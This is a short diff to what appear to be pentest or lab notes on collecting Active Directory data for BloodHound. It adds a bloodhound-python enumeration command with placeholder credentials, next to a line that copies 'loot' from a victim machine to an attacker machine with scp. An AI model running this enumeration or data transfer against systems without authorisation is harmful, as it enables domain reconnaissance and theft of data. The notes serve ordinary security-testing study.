@@ -3,7 +3,7 @@
 There are two different methods to ingest data for Bloodhound
 
 1) Sharphound
-2) Python script
+2) bloodhound-python
 
 
 ---
@@ -20,6 +20,14 @@ These commands will gather the .json files you need to run Bloodhound
 transfer loot.zip to attacker machine
 
 `scp -T victim@10.10.18.217:<file location> <attacker directory>`
+
+---
+
+### bloodhound-python
+
+```
+bloodhound-python -c All -u 'svc-admin' -p 'password' -gc 'foobar.local' -dc 'domainname.controller.local' -d domain.local -ns 10.10.10.10
+```
 
 ---
 
